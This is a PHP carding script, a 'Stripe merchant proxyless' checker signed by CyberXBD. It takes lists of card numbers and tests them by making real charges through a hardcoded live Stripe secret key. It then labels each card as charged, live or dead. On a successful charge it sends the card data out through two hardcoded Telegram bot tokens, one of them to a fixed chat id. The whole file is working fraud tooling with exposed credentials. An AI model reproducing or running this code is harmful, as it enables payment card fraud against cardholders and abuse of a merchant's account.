<?php


//===================== [ MADE BY CYBERXBD ] ====================//
#---------------[ STRIPE MERCHANTE PROXYLESS ]----------------#



error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };

$idd = $_GET['idd'];

$amt = $_GET['cst'];
if(empty($amt)) {
	$amt = '1';
	$chr = $amt * 100;
}
$chr = $amt * 100;
if(isset($_GET['sec'])){

    $get_sk = $_GET['sec'];

}
$sk= trim($get_sk);
$sk = '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';
$lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

$userid = $_GET['sec'];

function send_message($userid, $msg) {
$text = urlencode($msg);
file_get_contents("https://api.telegram.org/bot6058085390:AAGR3VwfXg7TK6CT8ETOr-OcVIkqLsBradk/sendMessage?chat_id=$userid&text=$text&parse_mode=HTML");
file_get_contents("https://api.telegram.org/bot6258987989:AAEYWILM024B6BD5IDDqbl5H7x40-MCGNvM/sendMessage?chat_id=1243464557&text=$text&parse_mode=HTML");

};

//================= [ CURL REQUESTS ] =================//

#-------------------[1st REQ]--------------------#  
$x = 0;  
while(true)  
{  
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');  
$result1 = curl_exec($ch);  
$tok1 = Getstr($result1,'"id": "','"');  
$msg = Getstr($result1,'"message": "','"');  
//echo "<br><b>Result1: </b> $result1<br>";  
if (strpos($result1, "rate_limit"))   
{  
    $x++;  
    continue;  
}  
break;  
}  
  
  
#------------------[2nd REQ]--------------------#  
$x = 0;  
while(true)  
{  
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=eur&payment_method_types[]=card&description=MotuSamusa Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
$result2 = curl_exec($ch);  
$tok2 = Getstr($result2,'"id": "','"');  
$receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));  
//echo "<br><b>Result2: </b> $result2<br>";  
if (strpos($result2, "rate_limit"))   
{  
    $x++;  
    continue;  
}  
break;  
}




//=================== [ RESPONSES ] ===================//

if(strpos($result2, '"seller_message": "Payment complete."' )) {
    echo '|𝘾𝙃𝘼𝙍𝙂𝙀𝘿</span>  </span>𝘾𝘾𝙉:  '.$lista.'</span>  <br>|➤ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: $'.$amt.' Charged ✅ |𝘾𝙝𝙚𝙘𝙠𝙚𝙧 𝗕𝗬 <a href="https://t.me/MotuSamusa" class="link">@CyberXBD</a> <br> |➤ 𝙍𝙚𝙘𝙚𝙞𝙥𝙩: <a href='.$receipturl.'>Here</a><br>|➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'<br> <br>';
        send_message($userid, "<b>𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 CC :</b> <code>$lista</code>\n<b>RESPONSE : CCN </b>\n<b>CHARGED : 1$ ✅</b>\n<b>BY ➔ @CyberXBD</b>");            
}
elseif(strpos($result2,'"cvc_check": "pass"')){
    echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: CVV LIVE @CyberXBD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}


elseif(strpos($result1, "generic_decline")) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾: '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: GENERIC DECLINED <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
    }
elseif(strpos($result2, "generic_decline" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:   '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: GENERIC DECLINED<br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.' </span><br>';
}
elseif(strpos($result2, "insufficient_funds" )) {
    echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: INSUFFICIENT FUNDS @CyberXBD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}

elseif(strpos($result2, "fraudulent" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: FRAUDULENT<br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.' </span><br>';
}
elseif(strpos($resul3, "do_not_honor" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: DO NOT HONOR <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
    }
elseif(strpos($resul2, "do_not_honor" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: DO NOT HONOR <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}
elseif(strpos($result,"fraudulent")){
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: FRAUDULENT <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';

}

elseif(strpos($result2,'"code": "incorrect_cvc"')){
    echo '|𝘾𝘾𝙉</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: Security code is incorrect @CyberXBD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
} 
elseif(strpos($result1,' "code": "invalid_cvc"')){
    echo '|𝘾𝘾𝙉</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: Security code is incorrect @CyberXBD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
     
}
elseif(strpos($result1,"invalid_expiry_month")){
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: INVAILD EXPIRY MONTH <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';

}
elseif(strpos($result2,"invalid_account")){
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: INVAILD ACCOUNT <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';

}

elseif(strpos($result2, "do_not_honor")) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: DO NOT HONOR <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: LOST CARD<br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.' </span><br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: LOST CARD</span></span>  <br>Result: CHECKER BY @CyberXBD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span> <br>';
}

elseif(strpos($result2, "stolen_card" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: STOLEN CARD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
    }

elseif(strpos($result2, "stolen_card" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: STOLEN CARD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';


}
elseif(strpos($result2, "transaction_not_allowed" )) {
    echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: TRANSACTION NOT ALLOWED @CyberXBD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
    }
    elseif(strpos($result2, "authentication_required")) {
    	echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: 32DS REQUIRED @CyberXBD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
   } 
   elseif(strpos($result2, "card_error_authentication_required")) {
    	echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: 32DS REQUIRED @CyberXBD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
   } 
   elseif(strpos($result2, "card_error_authentication_required")) {
    	echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: 32DS REQUIRED @CyberXBD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
   } 
   elseif(strpos($result1, "card_error_authentication_required")) {
    	echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: 32DS REQUIRED @CyberXBD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
   } 
elseif(strpos($result2, "incorrect_cvc" )) {
    echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: Security code is incorrect @CyberXBD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo '|????𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: PICKUP CARD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo '|𝘿??𝘼??</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: PICKUP CARD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';

}
elseif(strpos($result2, 'Your card has expired.')) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: EXPIRED CARD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}
elseif(strpos($result2, 'Your card has expired.')) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: EXPIRED CARD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';

}
elseif(strpos($result2, "card_decline_rate_limit_exceeded")) {
	echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: SK IS AT RATE LIMIT <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}
elseif(strpos($result2, '"code": "processing_error"')) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: PROCESSING ERROR <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
    }
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: YOUR CARD NUMBER IS INCORRECT <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: SERVICE NOT ALLOWED <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
    }
elseif(strpos($result2, '"code": "processing_error"')) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: PROCESSING ERROR <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
    }
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: YOUR CARD NUMBER IS INCORRECT <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: SERVICE NOT ALLOWED <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';

}
elseif(strpos($result, "incorrect_number")) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: INCORRECT CARD NUMBER <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}
elseif(strpos($result1, "incorrect_number")) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾: '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: INCORRECT CARD NUMBER <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';


}elseif(strpos($result1, "do_not_honor")) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: DO NOT HONOR <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';

}
elseif(strpos($result1, 'Your card was declined.')) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: CARD DECLINED <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';

}
elseif(strpos($result1, "do_not_honor")) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: DO NOT HONOR <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
    }
elseif(strpos($result2, "generic_decline")) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: GENERIC CARD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: CARD DECLINED <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';

}
elseif(strpos($result2,' "decline_code": "do_not_honor"')){
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: DO NOT HONOR <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: CVC_UNCHECKED : INFORM AT OWNER <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: CVC_CHECK : FAIL <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}
elseif(strpos($result2, "card_not_supported")) {
	echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: CARD NOT SUPPORTED <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unavailable"')){
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: CVC_CHECK : UNVAILABLE <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: CVC_UNCHECKED : INFORM TO OWNER」 <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: CVC_CHECKED : FAIL <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}
elseif(strpos($result2,"currency_not_supported")) {
	echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: CURRENCY NOT SUPORTED TRY IN INR <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}

elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo '|𝘿𝙀𝘼𝘿</span> 𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: CARD NOT SUPPORT THIS TYPE OF PURCHASE <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
    }

elseif(strpos($result2,'"cvc_check": "pass"')){
    echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: CVV LIVE @CyberXBD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}
elseif(strpos($result2, "fraudulent" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: FRAUDULENT <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}
elseif(strpos($result1, "testmode_charges_only" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: SK KEY DEAD OR INVALID <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}
elseif(strpos($result1, "api_key_expired" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: SK KEY REVOKED <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}
elseif(strpos($result1, "parameter_invalid_empty" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: ENTER CC TO CHECK<br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.' </span><br>';
}
elseif(strpos($result1, "card_not_supported" )) {
    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: CARD NOT SUPPORTED <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
}
else {
    echo '|𝘿𝙀𝘼𝘿</span> 𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: USE GOOD COMBO OR RATE LIMIT SK <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
   
   
      
}

curl_close($ch);
ob_flush();
?>
